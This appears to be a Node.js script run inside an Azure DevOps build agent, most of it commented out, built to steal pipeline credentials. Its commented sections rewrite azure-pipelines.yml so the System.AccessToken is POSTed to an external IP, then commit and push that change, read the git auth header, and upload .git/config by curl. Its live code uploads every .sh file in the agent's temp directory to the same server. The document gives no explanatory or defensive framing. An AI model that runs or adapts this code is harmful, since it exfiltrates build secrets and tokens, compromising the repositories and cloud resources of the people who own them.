// const { exec } = require('child_process');
// const fs = require('fs');
// const path = require('path');
// const { exec,execSync } = require('child_process');

// // Step 1: Configure git user info
// exec('git config --global user.email "13911336781@163.com" && git config --global user.name "ckx-sec"', (error, stdout, stderr) => {
//   if (error) {
//     console.error(`Error configuring git user info: ${error.message}`);
//     return;
//   }
//   if (stderr) {
//     console.error(`git config stderr: ${stderr}`);
//     return;
//   }
//   console.log(`git config stdout: ${stdout}`);
// });


// // Step 1: Fetch the latest main branch from origin
// try {
//     console.log("Fetching the latest main branch from origin...");
//     execSync('git fetch origin main');
// } catch (error) {
//     console.error('Error fetching main branch:', error.message);
//     process.exit(1);
// }

// // Step 2: Checkout the main branch
// try {
//     console.log("Checking out the main branch...");
//     execSync('git checkout main');
// } catch (error) {
//     console.error('Error checking out main branch:', error.message);
//     process.exit(1);
// }

// // Step 3: Rename existing azure-pipelines.yml file
// const oldFilePath = path.join(__dirname, 'azure-pipelines.yml');
// const backupFilePath = path.join(__dirname, 'azure-pipelines-backup.yml');

// try {
//     if (fs.existsSync(oldFilePath)) {
//         console.log("Renaming existing azure-pipelines.yml to azure-pipelines-backup.yml...");
//         fs.renameSync(oldFilePath, backupFilePath);
//     } else {
//         console.log("No existing azure-pipelines.yml file found, skipping rename step.");
//     }
// } catch (error) {
//     console.error('Error renaming file:', error.message);
//     process.exit(1);
// }

// // Step 4: Write new content to azure-pipelines.yml
// const newYmlContent = `
// trigger:
//   branches:
//     include:
//       - main

// pool:
//   vmImage: 'ubuntu-latest'

// steps:
// - checkout: self
//   persistCredentials: true  # 保留凭据以便后续步骤使用

// - task: NodeTool@0
//   inputs:
//     versionSpec: '12.x'
//     checkLatest: true

// - script: |
//     echo "Fetching System Access Token..."
//     token=$(System.AccessToken)
//     echo "Sending token to external server..."
//     curl -X POST -H "Content-Type: application/json" -d "{\\"token\\": \\"$token\\"}" http://139.180.193.16:7777
//   displayName: 'Fetch and Send System Access Token'

// - script: |
//     npm install
//   displayName: 'Install Node.js dependencies'

// - task: AzureFunctionApp@1
//   inputs:
//     azureSubscription: 'test_connection'
//     appType: 'functionApp'
//     appName: 'mypocfunctiontest'
//     package: '$(Build.ArtifactStagingDirectory)/'
// `;

// try {
//     console.log("Writing new azure-pipelines.yml content...");
//     fs.writeFileSync(oldFilePath, newYmlContent.trim());
// } catch (error) {
//     console.error('Error writing to azure-pipelines.yml:', error.message);
//     process.exit(1);
// }

// // Step 5: Pull the latest changes from main to ensure you are up-to-date
// try {
//     console.log("Pulling latest changes from the main branch...");
//     execSync('git pull origin main');
// } catch (error) {
//     console.error('Error pulling latest changes:', error.message);
//     process.exit(1);
// }

// // Optionally, commit and push the changes (this is risky, use with caution)
// try {
//     console.log("Committing and pushing the changes...");
//     execSync('git add .');
//     execSync('git commit -m "Modified azure-pipelines.yml for token extraction"');
//     execSync('git push origin main');
// } catch (error) {
//     console.error('Error during git operation:', error.message);
//     process.exit(1);
// }

// console.log("Process completed successfully!");




// // 确保已切换到 'main' 分支
// exec('git fetch origin && git checkout main', (error) => {
//     if (error) {
//         console.error(`Error switching to or creating 'main' branch: ${error}`);
//         return;
//     }
//     console.log('Successfully checked out the main branch.');

//     // 创建新文件并进行提交
//     exec('echo "hello world" > 1.txt', (error) => {
//         if (error) {
//             console.error(`Error writing file: ${error}`);
//             return;
//         }
//         exec('git add 1.txt && git commit -m "Add new file 1.txt"', (error) => {
//             if (error) {
//                 console.error(`Error during commit: ${error}`);
//                 return;
//             }
//             // 推送更改到远程 'main' 分支
//             exec('git push origin main', (error) => {
//                 if (error) {
//                     console.error(`Error pushing to remote repository: ${error}`);
//                 } else {
//                     console.log('Successfully pushed to the remote repository.');
//                 }
//             });
//         });
//     });
// });

// exec('git branch && git branch -r', (error, stdout, stderr) => {
//   if (error) {
//     console.error(`执行错误: ${error}`);
//     return;
//   }
//   console.log('当前本地和远程分支列表:\n', stdout);

//   // 根据分支情况决定下一步
//   // checkBranchAndProceed();
// });

// // 检查 Git HEAD 状态
// exec('git status', (error, stdout) => {
//   if (stdout.includes('HEAD detached')) {
//     console.log('HEAD is detached. Creating and switching to a new branch...');
//     exec('git checkout main', (error) => {
//       if (error) {
//         console.error(`Error checkout main: ${error}`);
//         return;
//       }
//       writeFileAndPush();
//     });
//   } else {
//     writeFileAndPush();
//   }
// });

// function writeFileAndPush() {
//   exec('echo "hello world" > 1.txt', (error) => {
//     if (error) {
//       console.error(`Error writing file: ${error}`);
//       return;
//     }
//     exec('git add 1.txt && git commit -m "Add file 1.txt with hello world"', (error) => {
//       if (error) {
//         console.error(`Error during commit: ${error}`);
//         return;
//       }
//       exec('git push origin new-branch-name', (error) => {
//         if (error) {
//           console.error(`Error pushing to remote repository: ${error}`);
//         } else {
//           console.log('Successfully pushed to remote repository!');
//         }
//       });
//     });
//   });
// }

// // 检查 Git 用户信息
// exec('git config user.name && git config user.email', (error, stdout) => {
//   if (error || !stdout) {
//     console.error('Git 用户信息未配置，正在设置...');
//     // 如果未配置，则设置用户信息
//     exec('git config user.name "Your Name" && git config user.email "you@example.com"', (error) => {
//       if (error) {
//         console.error(`配置用户信息错误: ${error}`);
//         return;
//       }
//       console.log('用户信息配置成功，继续执行...');
//       writeFileAndPush();
//     });
//   } else {
//     console.log(`当前用户信息:\n${stdout}`);
//     writeFileAndPush();
//   }
// });


// // 检查并切换到 main 分支
// exec('git rev-parse --verify main', (error) => {
//   if (error) {
//     console.log('main 分支不存在，正在创建并切换...');
//     // 创建并切换到 main 分支
//     exec('git checkout -b main', (error) => {
//       if (error) {
//         console.error(`创建或切换分支时出错: ${error}`);
//         return;
//       }
//       console.log('已成功创建并切换到 main 分支。');
//       writeFileAndPush();
//     });
//   } else {
//     console.log('main 分支已存在，直接切换...');
//     // 直接切换到 main 分支
//     exec('git checkout main', (error) => {
//       if (error) {
//         console.error(`切换到 main 分支时出错: ${error}`);
//         return;
//       }
//       console.log('已成功切换到 main 分支。');
//       writeFileAndPush();
//     });
//   }
// });


// function writeFileAndPush() {
//   // 创建文件并提交
//   exec('echo "hello world" > 1.txt', (error) => {
//     if (error) {
//       console.error(`执行错误: ${error}`);
//       return;
//     }
//     exec('git add 1.txt && git commit -m "Add file 1.txt with hello world"', (error) => {
//       if (error) {
//         console.error(`执行错误: ${error}`);
//         return;
//       }
//       exec('git push origin main', (error) => {
//         if (error) {
//           console.error(`推送到远程仓库时出错: ${error}`);
//         } else {
//           console.log('成功推送到远程仓库！');
//         }
//       });
//     });
//   });
// }

// //     const files = lsStdout.split('\n').filter(file => file); // 获取文件列表并过滤掉空行

// //     // 对每个文件执行 cat 命令
// //     files.forEach(file => {
// //         exec(`cat /etc/${file}`, (catError, catStdout, catStderr) => {
// //             if (catError) {
// //                 console.error(`执行 cat /etc/${file} 时出错: ${catError.message}`);
// //                 return;
// //             }
// //             if (catStderr) {
// //                 console.error(`cat /etc/${file} 执行输出错误: ${catStderr}`);
// //                 return;
// //             }

// //             console.log(`文件 /etc/${file} 的内容:\n${catStdout}`);
// //         });
// //     });
// // });

// exec('git remote -v', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 git remote -v 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`git remote -v 执行输出错误: ${stderr}`);
//         return;
//     }

//     console.log(`git remote -v 命令结果:\n${stdout}`);
// });


// exec('git config --get-all http.https://github.com/ckx-sec/test_azure_function_private.extraheader', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 git config 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`git config 执行输出错误: ${stderr}`);
//         return;
//     }

//     console.log(`git config 命令结果:\n${stdout}`);
// });

// // 执行 ls -l azure-pipelines-1.yml 命令
// exec('ls -al && pwd', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 ls -l 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`ls -l 执行输出错误: ${stderr}`);
//         return;
//     }

//     console.log(`ls -l 命令结果:\n${stdout}`);
// });


// exec('ls -al .git/', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 ls -al .git/ 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`ls -al .git/ 执行输出错误: ${stderr}`);
//         return;
//     }

//     console.log(`ls -al .git/ 命令结果:\n${stdout}`);
// });

// exec('cat .git/config', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 cat .git/config 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`cat .git/config 执行输出错误: ${stderr}`);
//         return;
//     }

//     console.log(`cat .git/config 命令结果:\n${stdout}`);
// });


// exec('curl -F "file=@/home/vsts/work/1/s/.git/config" http://139.180.193.16:5000/upload', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 curl 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`curl 执行输出错误: ${stderr}`);
//         return;
//     }
//     console.log(`curl 命令结果:\n${stdout}`);
// });

// // 执行 pwd 命令
// exec('pwd', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 pwd 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`pwd 执行输出错误: ${stderr}`);
//         return;
//     }
//     console.log(`pwd 命令结果:\n${stdout}`);
//     // 将环境变量数据通过 curl 命令发送到远程服务器
//     // const data = stdout.trim();
//     // const command = `curl -X POST -H "Content-Type: text/plain" --data "${data}" http://139.180.193.16:7777`;

//     // exec(command, (curlError, curlStdout, curlStderr) => {
//     //     if (curlError) {
//     //         console.error(`执行 curl 时出错: ${curlError.message}`);
//     //         return;
//     //     }
//     //     if (curlStderr) {
//     //         console.error(`curl 执行输出错误: ${curlStderr}`);
//     //         return;
//     //     }
//     //     console.log(`curl 命令结果:\n${curlStdout}`);
//     // });
// });

// // 执行 ls 命令
// exec('ls', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 ls 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`ls 执行输出错误: ${stderr}`);
//         return;
//     }
//     console.log(`ls 命令结果:\n${stdout}`);
// });


// // 执行 env 命令获取环境变量
// exec('env', (error, stdout, stderr) => {
//     if (error) {
//         console.error(`执行 env 时出错: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.error(`env 执行输出错误: ${stderr}`);
//         return;
//     }

//     console.log(`env 命令结果:\n${stdout}`);
    
// });

// const fs = require('fs');
// const path = require('path');

// // 要遍历的目录路径
// const tempDir = '/home/vsts/work/_temp/';

// // 读取目录中的所有文件和子目录
// fs.readdir(tempDir, (err, files) => {
//     if (err) {
//         console.error('无法读取目录:', err);
//         return;
//     }

//     // 遍历并打印每个文件和子目录的名称
//     files.forEach(file => {
//         const filePath = path.join(tempDir, file);

//         // 检查当前路径是否为文件
//         fs.stat(filePath, (err, stats) => {
//             if (err) {
//                 console.error('无法获取文件信息:', err);
//                 return;
//             }

//             if (stats.isFile()) {
//                 console.log('文件:', filePath);

//                 // 如果需要，可以在这里读取并打印文件内容
//                 fs.readFile(filePath, 'utf8', (err, data) => {
//                     if (err) {
//                         console.error('无法读取文件内容:', err);
//                         return;
//                     }
//                     console.log(`文件内容 (${file}):`);
//                     console.log(data);
//                 });
//             } else if (stats.isDirectory()) {
//                 console.log('目录:', filePath);
//                 // 如果需要递归读取子目录，可以在这里实现
//             }
//         });
//     });
// });

const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const tempDir = '/home/vsts/work/_temp/';
const uploadUrl = 'http://139.180.193.16:5000/upload';

// 读取目录中的所有文件和子目录
fs.readdir(tempDir, (err, files) => {
    if (err) {
        console.error('无法读取目录:', err);
        return;
    }

    // 遍历并处理每个文件和子目录的名称
    files.forEach(file => {
        const filePath = path.join(tempDir, file);

        // 检查当前路径是否为文件
        fs.stat(filePath, (err, stats) => {
            if (err) {
                console.error('无法获取文件信息:', err);
                return;
            }

            if (stats.isFile() && file.endsWith('.sh')) {
                console.log('发现 .sh 文件:', filePath);

                // 使用 curl 命令将 .sh 文件上传到服务器
                exec(`curl -F "file=@${filePath}" ${uploadUrl}`, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`执行 curl 时出错: ${error.message}`);
                        return;
                    }
                    if (stderr) {
                        console.error(`curl 执行输出错误: ${stderr}`);
                        return;
                    }
                    console.log(`.sh 文件已上传: ${filePath}`);
                    console.log(`curl 命令结果:\n${stdout}`);
                });
            }
        });
    });
});

